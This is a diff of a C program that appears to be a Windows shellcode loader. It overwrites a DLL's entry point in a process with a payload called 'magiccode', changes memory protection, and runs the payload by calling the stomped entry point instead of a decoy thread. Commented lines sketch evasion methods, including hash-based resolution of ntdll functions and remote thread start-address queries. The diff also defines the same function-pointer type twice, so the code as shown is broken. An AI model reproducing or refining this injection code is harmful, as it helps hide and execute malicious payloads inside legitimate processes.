@@ -18,6 +18,8 @@
 #include <ctype.h>
 
 
+typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
+typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);
 
 
 // void customUuidFromString(const char* uuidStr, unsigned char* bytes) {
@@ -1289,6 +1291,11 @@ int main(int argc, char *argv[])
 
     printf("[*] dllEntryPoint: %p\n", dllEntryPoint);
 
+
+   // we can also query the thread entry point of remote process using: NtQueryInformationThread
+   //    NtQueryInformationThread(pi.hThread, (THREADINFOCLASS)9, &ThreadQuerySetWin32StartAddress, sizeof(PVOID), &retlen);
+   // ThreadQuerySetWin32StartAddress is the address of entry point we want to write to in the remote process. 
+
     // DWORD oldProtect = 0;
     // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
     //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
@@ -1326,6 +1333,8 @@ int main(int argc, char *argv[])
         printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));
     }
     // printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));
+
+    //
 
     if (hProcess != NULL) {
         result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
@@ -1367,18 +1376,37 @@ int main(int argc, char *argv[])
 		printf("[+] Magic code casted.\n");
 	}
 
+    // To trigger the execution? 
+    // DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
+    // (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
 
-    DWORD threadID;
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint_decoy, NULL, 0, &threadID);
-    if (hThread == NULL) {
-        printf("Failed to create a thread. Error: %lu\n", GetLastError());
-        FreeLibrary(hDll);
-        UnmapViewOfFile(fileBase);
-        // CloseHandle(fileMapping);
-        CloseHandle(fileHandle);
-        CloseHandle(hSection);
-        return 1;
-    }
+    // void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
+    // NtClose_t g_nt_close = (NtClose_t) p_nt_close;
+    // g_nt_close(h_file);
+
+    // void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
+    // NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
+    // g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);
+
+    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)hDll + entryPointRVA);
+
+    (*DllEntry)((HINSTANCE)hDll, DLL_PROCESS_ATTACH, 0);
+    // TODO: 
+    
+    // DWORD threadID;
+    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint_decoy, NULL, 0, &threadID);
+    // if (hThread == NULL) {
+    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
+    //     FreeLibrary(hDll);
+    //     UnmapViewOfFile(fileBase);
+    //     // CloseHandle(fileMapping);
+    //     CloseHandle(fileHandle);
+    //     CloseHandle(hSection);
+    //     return 1;
+    // }
+
+    // //wait for thread to finish:
+    // WaitForSingleObject(hThread, INFINITE);
 
 	printf("[+] No need to create thread.\n");
 
